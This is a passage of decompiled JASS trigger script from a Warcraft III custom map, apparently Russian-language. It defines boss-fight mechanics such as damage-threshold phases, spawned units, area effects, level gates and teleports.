set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjJ))
call ForGroupBJ(SR,function BjK)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjL))
call ForGroupBJ(SR,function BjM)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjN))
call ForGroupBJ(SR,function BjO)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjP))
call ForGroupBJ(SR,function BjQ)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjR))
call ForGroupBJ(SR,function BjS)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjT))
call ForGroupBJ(SR,function BjU)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjV))
call ForGroupBJ(SR,function BjW)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjX))
call ForGroupBJ(SR,function BjY)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjZ))
call ForGroupBJ(SR,function Bja)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjb))
call ForGroupBJ(SR,function Bjc)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjd))
call ForGroupBJ(SR,function Bje)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjf))
call ForGroupBJ(SR,function Bjg)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjh))
call ForGroupBJ(SR,function Bji)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjj))
call ForGroupBJ(SR,function Bjk)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjl))
call ForGroupBJ(SR,function Bjm)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjn))
call ForGroupBJ(SR,function Bjo)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjp))
call ForGroupBJ(SR,function Bjq)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjr))
call ForGroupBJ(SR,function Bjs)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjt))
call ForGroupBJ(SR,function Bju)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjv))
call ForGroupBJ(SR,function Bjw)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjx))
call ForGroupBJ(SR,function Bjy)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bjz))
call ForGroupBJ(SR,function Bj0)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bj1))
call ForGroupBJ(SR,function Bj2)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bj3))
call ForGroupBJ(SR,function Bj4)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bj5))
call ForGroupBJ(SR,function Bj6)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bj7))
call ForGroupBJ(SR,function Bj8)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bj9))
call ForGroupBJ(SR,function BkB)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BkC))
call ForGroupBJ(SR,function BkD)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BkE))
call ForGroupBJ(SR,function BkF)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BkG))
call ForGroupBJ(SR,function BkH)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call PauseUnit(GetTriggerUnit(),false)
call SetUnitInvulnerable(Lo,false)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BkK takes nothing returns nothing
set eo=CreateTrigger()
call TriggerRegisterUnitEvent(eo,Lo,EVENT_UNIT_DAMAGED)
call TriggerAddAction(eo,function BkJ)
endfunction
function BkL takes nothing returns nothing
call PauseUnit(GetEnumUnit(),false)
set Vz=GetUnitLoc(GetTriggerUnit())
call IssuePointOrderLocBJ(GetEnumUnit(),"dreadlordinferno",Vz)
call RemoveLocation(Vz)
endfunction
function BkM takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(Tc[4])) then
return false
endif
return true
endfunction
function BkN takes nothing returns nothing
if BkM() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(Tc[4]))
set Tc[4]=Tc[4]-10
set Vz=GetRandomLocInRect(FH)
call CreateNUnitsAtLoc(1,$68303153,Player(10),Vz,bj_UNIT_FACING)
call SetUnitVertexColor(GetLastCreatedUnit(),255,0,255,255)
call PauseUnit(GetLastCreatedUnit(),true)
call CreateNUnitsAtLoc(1,$68303349,Player(0),Vz,bj_UNIT_FACING)
call SetUnitFlyHeight(GetLastCreatedUnit(),250.,99999.)
call SetUnitTimeScale(GetLastCreatedUnit(),.33)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
call TriggerSleepAction(2.)
set SR=GetUnitsOfTypeIdAll($68303153)
call ForGroupBJ(SR,function BkL)
call DestroyGroup(SR)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BkO takes nothing returns nothing
set ep=CreateTrigger()
call TriggerRegisterUnitEvent(ep,Lo,EVENT_UNIT_DAMAGED)
call TriggerAddAction(ep,function BkN)
endfunction
function BkP takes nothing returns boolean
if not (GetKillingUnit()==L5) then
return false
endif
if not (IsUnitIllusion(GetTriggerUnit())==false) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BkQ takes nothing returns boolean
if not (S4>=4) then
return false
endif
return true
endfunction
function BkR takes nothing returns nothing
set S4=S4+1
call CreateTextTagUnitBJ("+"+I2S(S4),L5,0,20.,100,0.,100,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
if BkQ() then
call CreateItemLoc($4930595A,GetRectCenter(D7))
call KillUnit(L5)
else
endif
endfunction
function BkS takes nothing returns nothing
set eq=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(eq,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(eq,Condition(function BkP))
call TriggerAddAction(eq,function BkR)
endfunction
function BkT takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$75303055) then
return false
endif
return true
endfunction
function BkU takes nothing returns nothing
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
endfunction
function BkV takes nothing returns nothing
set er=CreateTrigger()
call TriggerRegisterEnterRectSimple(er,D8)
call TriggerRegisterEnterRectSimple(er,D9)
call TriggerRegisterEnterRectSimple(er,EB)
call TriggerRegisterEnterRectSimple(er,EC)
call TriggerAddCondition(er,Condition(function BkT))
call TriggerAddAction(er,function BkU)
endfunction
function BkW takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[15]) then
return false
endif
return true
endfunction
function BkX takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[15])
set Tt[15]=Tt[15]-5.
set Vz=GetUnitLoc(GetTriggerUnit())
call IssuePointOrderLoc(GetTriggerUnit(),"silence",Vz)
call RemoveLocation(Vz)
set V0=GetRectCenter(D2)
set Vz=PolarProjectionBJ(V0,600.,GetRandomReal(0,360.))
call CreateNUnitsAtLoc(1,$68303431,Player(10),Vz,bj_UNIT_FACING)
call IssuePointOrderLoc(GetLastCreatedUnit(),"carrionswarm",V0)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call CreateTextTagUnitBJ("Ко дну!",GetLastCreatedUnit(),0,12.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call RemoveLocation(V0)
call RemoveLocation(Vz)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BkY takes nothing returns nothing
set es=CreateTrigger()
call TriggerRegisterUnitEvent(es,L4,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(es,Condition(function BkW))
call TriggerAddAction(es,function BkX)
endfunction
function BkZ takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[16]) then
return false
endif
return true
endfunction
function Bka takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[16])
set Tt[16]=Tt[16]-3.
set Vz=GetRandomLocInRect(D2)
call CreateNUnitsAtLoc(1,$68303551,Player(10),Vz,GetRandomReal(0,360.))
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bkb takes nothing returns nothing
set et=CreateTrigger()
call TriggerRegisterUnitEvent(et,L4,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(et,Condition(function BkZ))
call TriggerAddAction(et,function Bka)
endfunction
function Bkc takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bkd takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())-10000.)
endfunction
function Bke takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303551) then
return false
endif
return true
endfunction
function Bkf takes nothing returns nothing
if Bke() then
set Vz=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bkc))
call ForGroupBJ(SR,function Bkd)
call DestroyGroup(SR)
call RemoveLocation(Vz)
else
endif
endfunction
function Bkg takes nothing returns nothing
set eu=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(eu,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(eu,function Bkf)
endfunction
function Bkh takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[17]) then
return false
endif
return true
endfunction
function Bki takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[17])
set Tt[17]=Tt[17]-20.
set Vz=GetRandomLocInRect(D2)
call CreateNUnitsAtLoc(1,$68303252,Player(10),Vz,GetRandomReal(0,360.))
call UnitApplyTimedLifeBJ(2.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bkj takes nothing returns nothing
set ev=CreateTrigger()
call TriggerRegisterUnitEvent(ev,L4,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(ev,Condition(function Bkh))
call TriggerAddAction(ev,function Bki)
endfunction
function Bkk takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(5.)
set SR=GetUnitsInRectAll(D2)
call SetUnitManaPercentBJ(GroupPickRandomUnit(SR),0.)
call DestroyGroup(SR)
call TriggerSleepAction(2.)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bkl takes nothing returns nothing
set ew=CreateTrigger()
call TriggerRegisterUnitEvent(ew,L4,EVENT_UNIT_DAMAGED)
call TriggerAddAction(ew,function Bkk)
endfunction
function Bkm takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bkn takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())<50) then
return false
endif
return true
endfunction
function Bko takes nothing returns nothing
local location Mc
if Bkn() then
call KillUnit(GetTriggerUnit())
call DisplayTextToForce(GetPlayersAll(),"|c00ffffffУровень слишком мал!")
else
call SetUnitLifePercentBJ(L4,100)
set Mc=GetRectCenter(D2)
call SetUnitPositionLoc(GetTriggerUnit(),Mc)
call RemoveLocation(Mc)
call SetUnitOwner(L4,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(L4,true)
set Tt[15]=93.
set Tt[16]=95.
set Tt[17]=80.
endif
set Mc=null
endfunction
function Bkp takes nothing returns nothing
set Un=CreateTrigger()
call DisableTrigger(Un)
call TriggerRegisterEnterRectSimple(Un,Gv)
call TriggerAddCondition(Un,Condition(function Bkm))
call TriggerAddAction(Un,function Bko)
endfunction
function Bkq takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=45) then
return false
endif
return true
endfunction
function Bkr takes nothing returns nothing
if Bkq() then
set V0=Location(-7777.,-22400.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call SetUnitLifePercentBJ(K3,100)
call SetUnitOwner(K3,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(K3,true)
call RemoveLocation(V0)
set Tt[100]=80.
else
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"|c00ff0000Для входа требуется 45 уровень.")
endif
endfunction
function Bks takes nothing returns nothing
set Uy=CreateTrigger()
call TriggerRegisterEnterRectSimple(Uy,Ew)
call TriggerAddAction(Uy,function Bkr)
endfunction
function Bkt takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[100]) then
return false
endif
return true
endfunction
function Bku takes nothing returns boolean
if IsUnitAliveBJ(Wi[5])==true then
return true
endif
if IsUnitAliveBJ(Wi[6])==true then
return true
endif
return false
endfunction
function Bkv takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bkw takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bkx takes nothing returns boolean
if not Bku() then
return false
endif
return true
endfunction
function Bky takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[100])
if Bkx() then
call SetUnitLifePercentBJ(K3,100)
call RemoveUnit(Wi[5])
call RemoveUnit(Wi[6])
call ForGroupBJ(GetUnitsInRectMatching(Gx,Condition(function Bkv)),function Bkw)
set Tt[100]=80.
else
set Tt[100]=Tt[100]-20.
set V0=GetRandomLocInRect(Gx)
set Wi[5]=CreateUnitAtLoc(Player(10),$68303553,V0,270.)
call RemoveLocation(V0)
set V0=GetRandomLocInRect(Gx)
set Wi[6]=CreateUnitAtLoc(Player(10),$68303552,V0,270.)
call RemoveLocation(V0)
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bkz takes nothing returns nothing
set ex=CreateTrigger()
call TriggerRegisterUnitEvent(ex,K3,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(ex,Condition(function Bkt))
call TriggerAddAction(ex,function Bky)
endfunction
function Bk0 takes nothing returns boolean
if not (GetUnitTypeId(GetSpellTargetUnit())==$6E303539) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bk1 takes nothing returns nothing
call IssueImmediateOrder(GetSpellTargetUnit(),"howlofterror")
call UnitDamageTargetBJ(GetTriggerUnit(),GetTriggerUnit(),15000.,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_NORMAL)
endfunction
function Bk2 takes nothing returns nothing
set ey=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ey,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(ey,Condition(function Bk0))
call TriggerAddAction(ey,function Bk1)
endfunction
function Bk3 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateNUnitsAtLoc(GetRandomInt(1,3),$6E303538,Player(10),GetUnitLoc(GetTriggerUnit()),bj_UNIT_FACING)
call TriggerSleepAction(30.)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bk4 takes nothing returns nothing
set ez=CreateTrigger()
call TriggerRegisterUnitEvent(ez,LD,EVENT_UNIT_DAMAGED)
call TriggerAddAction(ez,function Bk3)
endfunction
function Bk5 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function Bk6 takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())-GetUnitStateSwap(UNIT_STATE_MAX_LIFE,GetEnumUnit())/3.)
endfunction
function Bk7 takes nothing returns nothing
local location d2
local group Xx
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(10.)
set d2=GetUnitLoc(GetTriggerUnit())
set Xx=GetUnitsInRangeOfLocMatching(800.,d2,Condition(function Bk5))
call ForGroupBJ(Xx,function Bk6)
call RemoveLocation(d2)
call DestroyGroup(Xx)
call EnableTrigger(GetTriggeringTrigger())
set Xx=null
set d2=null
endfunction
function Bk8 takes nothing returns nothing
set e0=CreateTrigger()
call TriggerRegisterUnitEvent(e0,LK,EVENT_UNIT_DAMAGED)
call TriggerAddAction(e0,function Bk7)
endfunction
function Bk9 takes nothing returns nothing
local location Mc
local group No
local boolexpr Np
local integer Nt
local unit Ny
if GetUnitTypeId(GetTriggerUnit())==$6E6D6764 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(3)
call UnitRemoveAbility(Lw,$414F6878)
call UnitRemoveAbility(Lw,$41637269)
call UnitRemoveAbility(Lw,$41457362)
call UnitRemoveAbility(Lw,$41436362)
call UnitRemoveAbility(Lw,$416D6264)
set Mc=GetUnitLoc(Lw)
set No=CreateGroup()
set Np=Condition(function mv)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),1500,Np)
set Nt=GetRandomInt(1,5)
set Ny=GroupPickRandomUnit(No)
if Nt==1 then
call nh(Lw,"Полиморф!",.035,100,255,255)
call UnitAddAbility(Lw,$414F6878)
call SetUnitAbilityLevel(Lw,$414F6878,2)
call IssueTargetOrder(Lw,"hex",Ny)
elseif Nt==2 then
call nh(Lw,"Увечье!",.035,100,255,255)
call UnitAddAbility(Lw,$41637269)
call IssueTargetOrder(Lw,"cripple",Ny)
elseif Nt==3 then
call nh(Lw,"Звездопад!",.035,100,255,255)
call UnitAddAbility(Lw,$41457362)
call IssueImmediateOrder(Lw,"starfall")
elseif Nt==4 then
call nh(Lw,"Ледяная звезда!",.035,100,255,255)
call UnitAddAbility(Lw,$41436362)
call IssueTargetOrder(Lw,"thunderbolt",Ny)
elseif Nt==5 then
call nh(Lw,"Похищение маны!",.035,100,255,255)
call UnitAddAbility(Lw,$416D6264)
call IssueTargetOrder(Lw,"manaburn",Ny)
endif
call DestroyGroup(No)
call DestroyBoolExpr(Np)
set No=null
set Np=null
set Ny=null
call EnableTrigger(GetTriggeringTrigger())
endif
set Mc=null
endfunction
function BlB takes nothing returns nothing
local location Ht=GetUnitLoc(Lw)
call SetUnitPositionLoc(GetEnumUnit(),Ht)
call SetUnitLifePercentBJ(GetEnumUnit(),5)
call RemoveLocation(Ht)
set Ht=null
endfunction
function BlC takes nothing returns nothing
local location Mc
local group No
local boolexpr Np
if GetUnitTypeId(GetTriggerUnit())==$6E6D6764 then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(10.)
set Mc=GetUnitLoc(GetTriggerUnit())
set No=CreateGroup()
set Np=Condition(function mv)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),1500,Np)
call ForGroup(No,function BlB)
call DestroyGroup(No)
call DestroyBoolExpr(Np)
call RemoveLocation(Mc)
set Np=null
set No=null
set Mc=null
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function BlD takes nothing returns nothing
set e1=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(e1,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddAction(e1,function BlC)
call TriggerAddAction(e1,function Bk9)
